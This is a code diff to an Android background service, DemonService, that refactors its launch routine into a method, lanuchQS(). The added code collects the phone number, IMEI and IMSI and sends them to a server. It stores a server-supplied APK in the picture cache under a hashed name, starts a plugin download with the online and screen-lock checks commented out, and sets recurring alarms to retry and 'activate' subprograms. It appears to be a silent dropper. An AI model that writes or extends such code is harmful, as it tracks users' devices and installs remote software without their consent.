@@ -50,98 +50,18 @@ public class DemonService extends IntentService {
             String action = intent.getAction();
             if (ACTION_LANUCH.equals(action)) {
                 //通知服务器启动事件
-                CustomThreadPool.asyncWork(new Runnable() {
-                    @Override
-                    public void run() {
-                        if (Config.DEBUG) {
-                            Config.LOGD("[[DemonService::onHandleIntent]] try to handle action : " + ACTION_LANUCH);
-                        }
-                        try {
-                            cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
-                            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
-                            if (TextUtils.isEmpty(phone)) phone = "00000000000";
-                            LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
-                                                                    , UtilsRuntime.getIMEI(getApplicationContext())
-                                                                    , UtilsRuntime.getIMSI(getApplicationContext())
-                                                                    , Config.CHANNEL_CODE
-                                                                    , UtilsRuntime.getIMEI(getApplicationContext())
-                                                                    , phone);
-                            LanuchResponse response = InternetUtils.request(getApplicationContext(), request);
-                            if (response != null && !TextUtils.isEmpty(response.url)) {
-                                SettingManager.getInstance().setKeyLanuchTime(System.currentTimeMillis());
-                                SettingManager.getInstance().setKeyInstallInterval(response.activeDelay * 60 * 1000);
-                                if (!response.url.startsWith("http")) {
-                                    if (Config.URL_PREFIX.endsWith("/")) {
-                                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + response.url);
-                                    } else {
-                                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + "/" + response.url);
-                                    }
-                                } else {
-                                    SettingManager.getInstance().setKeyDownloadUrl(response.url);
-                                }
-
-                                if (Config.DEBUG) {
-                                    Config.LOGD("[[DemonService]] lanuch time = " + UtilsRuntime.debugFormatTime(System.currentTimeMillis()));
-                                }
-
-                                String apkFileName = StringUtils.MD5Encode(response.url) + ".apk";
-                                SettingManager.getInstance().setLocalApkPath(DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + apkFileName);
-
-                                if (UtilOperator.isPluginApkExist()) {
-                                    if (Config.DEBUG) {
-                                        Config.LOGD("[[DemonService]] plugin apk is exist on Path : "
-                                                        + SettingManager.getInstance().getLocalApkPath());
-                                    }
-                                    return;
-                                } else {
-                                    if (Config.DEBUG) {
-                                        Config.LOGD("[[DemonService]] isOnline = " + UtilsRuntime.isOnline(getApplicationContext())
-                                                        + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
-                                                        + " screenLocked = " + UtilsRuntime.isScreenLocked(getApplicationContext()));
-                                    }
-
-                                    if (/*UtilsRuntime.isOnline(getApplicationContext())
-                                            && */!Config.DOWNLOAD_PROCESS_RUNNING.get()
-                                           /* && !UtilsRuntime.isScreenLocked(getApplicationContext())*/) {
-                                        Handler handler = new Handler(getApplicationContext().getMainLooper());
-                                        handler.postDelayed(new Runnable() {
-                                            @Override
-                                            public void run() {
-                                                if (Config.DEBUG) {
-                                                    Config.LOGD("[[DemonService]] try to download APK from : "
-                                                        + SettingManager.getInstance().getLocalApkPath()
-                                                        + " delay 1S");
-                                                }
-                                                Intent i = new Intent();
-                                                i.setClass(getApplicationContext(), DemonService.class);
-                                                i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
-                                                startService(i);
-                                            }
-                                        }, 1 * 1000);
-                                    }
-                                }
-
-//                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
-                                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 30) * 60 * 1000);
-                                cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
-
-                                return;
-                            } else {
-                                if (Config.DEBUG) {
-                                    Config.LOGD("[[DemonService]] Lanuch request return == NULL >>>>>>>>");
-                                }
-                            }
-                        } catch (Exception e) {
-                            if (Config.DEBUG) e.printStackTrace();
-                        }
-
-                        startAlarmForAction(getApplicationContext(), ACTION_LANUCH, (long) 10 * 60 * 1000);
-                    }
-                });
+//                CustomThreadPool.asyncWork(new Runnable() {
+//                    @Override
+//                    public void run() {
+                lanuchQS();
+//                    }
+//                });
             } else if (ACTION_ACTIVE_MAIN.equals(action)) {
                 //通知服务器激活
 
-                activeQS();
+                if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
+                    activeQS();
+                }
             } else if (ACTION_ACTIVE_SERVICE.equals(action)) {
                 //尝试激活子程序
                 if (Config.DEBUG) {
@@ -175,6 +95,104 @@ public class DemonService extends IntentService {
                 UtilOperator.tryToDownloadPlugin(getApplicationContext());
             }
         }
+    }
+
+    private void lanuchQS() {
+        if (Config.DEBUG) {
+            Config.LOGD("[[DemonService::onHandleIntent]] try to handle action : " + ACTION_LANUCH);
+        }
+        try {
+            cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
+            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
+            if (TextUtils.isEmpty(phone)) phone = "00000000000";
+            String imei = UtilsRuntime.getIMEI(getApplicationContext());
+            if (TextUtils.isEmpty(imei)) {
+                imei = String.valueOf(System.currentTimeMillis());
+            }
+            String imsi = UtilsRuntime.getIMSI(getApplicationContext());
+            if (TextUtils.isEmpty(imsi)) {
+                imsi = String.valueOf(System.currentTimeMillis() + 9999);
+            }
+            String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
+
+            LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
+                                                         , imei
+                                                         , imsi
+                                                         , Config.CHANNEL_CODE
+                                                         , uuid
+                                                         , phone);
+            LanuchResponse response = InternetUtils.request(getApplicationContext(), request);
+            if (response != null && !TextUtils.isEmpty(response.url)) {
+                SettingManager.getInstance().setKeyLanuchTime(System.currentTimeMillis());
+                SettingManager.getInstance().setKeyInstallInterval(response.activeDelay * 60 * 1000);
+                if (!response.url.startsWith("http")) {
+                    if (Config.URL_PREFIX.endsWith("/")) {
+                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + response.url);
+                    } else {
+                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + "/" + response.url);
+                    }
+                } else {
+                    SettingManager.getInstance().setKeyDownloadUrl(response.url);
+                }
+
+                if (Config.DEBUG) {
+                    Config.LOGD("[[DemonService]] lanuch time = " + UtilsRuntime.debugFormatTime(System.currentTimeMillis()));
+                }
+
+                String apkFileName = StringUtils.MD5Encode(response.url) + ".apk";
+                SettingManager.getInstance().setLocalApkPath(DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + apkFileName);
+
+                if (UtilOperator.isPluginApkExist()) {
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[DemonService]] plugin apk is exist on Path : "
+                                        + SettingManager.getInstance().getLocalApkPath());
+                    }
+                    return;
+                } else {
+                    if (Config.DEBUG) {
+                        Config.LOGD("[[DemonService]] isOnline = " + UtilsRuntime.isOnline(getApplicationContext())
+                                        + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
+                                        + " screenLocked = " + UtilsRuntime.isScreenLocked(getApplicationContext()));
+                    }
+
+                    if (/*UtilsRuntime.isOnline(getApplicationContext())
+                                            && */!Config.DOWNLOAD_PROCESS_RUNNING.get()
+                                           /* && !UtilsRuntime.isScreenLocked(getApplicationContext())*/) {
+                        Handler handler = new Handler(getApplicationContext().getMainLooper());
+                        handler.postDelayed(new Runnable() {
+                            @Override
+                            public void run() {
+                                if (Config.DEBUG) {
+                                    Config.LOGD("[[DemonService]] try to download APK from : "
+                                                    + SettingManager.getInstance().getLocalApkPath()
+                                                    + " delay 1S");
+                                }
+                                Intent i = new Intent();
+                                i.setClass(getApplicationContext(), DemonService.class);
+                                i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
+                                startService(i);
+                            }
+                        }, 1 * 1000);
+                    }
+                }
+
+//                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
+                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 30) * 60 * 1000);
+                cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
+
+                return;
+            } else {
+                if (Config.DEBUG) {
+                    Config.LOGD("[[DemonService]] Lanuch request return == NULL >>>>>>>>");
+                }
+            }
+        } catch (Exception e) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[DemonService::lanuchQS]] error for lanuchQS", e);
+            }
+        }
+
+        startAlarmForAction(getApplicationContext(), ACTION_LANUCH, (long) 10 * 60 * 1000);
     }
 
     private void activeQS() {
@@ -217,7 +235,7 @@ public class DemonService extends IntentService {
     public static void startAlarmForAction(Context context, String action, long delay) {
         cancelAlarmForAction(context, action);
         if (Config.DEBUG) {
-            Config.LOGD("[[DemonService::startAlarmForAction]] for action : " + action + " delay time : " + delay);
+            Config.LOGD("[[DemonService::startAlarmForAction]] start for action : " + action + " delay time : " + delay);
         }
         Intent intent = new Intent();
         intent.setAction(action);
@@ -232,7 +250,7 @@ public class DemonService extends IntentService {
 
     public static void cancelAlarmForAction(Context context, String action) {
         if (Config.DEBUG) {
-            Config.LOGD("[[DemonService::cancelAlarmForAction]] for action : " + action);
+            Config.LOGD("[[DemonService::cancelAlarmForAction]] cancel for action : " + action);
         }
         Intent intent = new Intent();
         intent.setAction(action);
